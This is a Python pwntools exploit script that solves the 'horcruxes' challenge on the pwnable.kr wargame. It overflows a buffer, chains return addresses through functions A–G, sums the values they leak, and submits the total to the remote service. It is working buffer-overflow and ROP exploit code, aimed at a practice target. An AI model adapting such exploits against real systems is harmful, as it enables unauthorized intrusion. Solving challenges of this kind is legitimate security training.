from pwn import *

def parse_exp(text):
    exp = 0
    for i in text.split():
        if i[0] == "+":
            if i[1] == "-":
                exp += int(i[1:-1])
            else:
                exp += int(i[:-1])
    return exp

elf = ELF("horcruxes")

ropme = elf.symbols["ropme"]

ROP =  p32(elf.symbols["A"])
ROP += p32(elf.symbols["B"])
ROP += p32(elf.symbols["C"])
ROP += p32(elf.symbols["D"])
ROP += p32(elf.symbols["E"])
ROP += p32(elf.symbols["F"])
ROP += p32(elf.symbols["G"])

ROP += p32(0x0809fffc) # call ropme

p = remote("pwnable.kr", 9032)

payload = "A"*0x79 + ROP

print p.recv()
p.sendline("")
print p.recv()
p.sendline(payload)
print p.recv()
text = p.recv()
exp = parse_exp(text)
p.sendline("1")
print p.recv()
p.sendline(str(exp))
print p.recv()
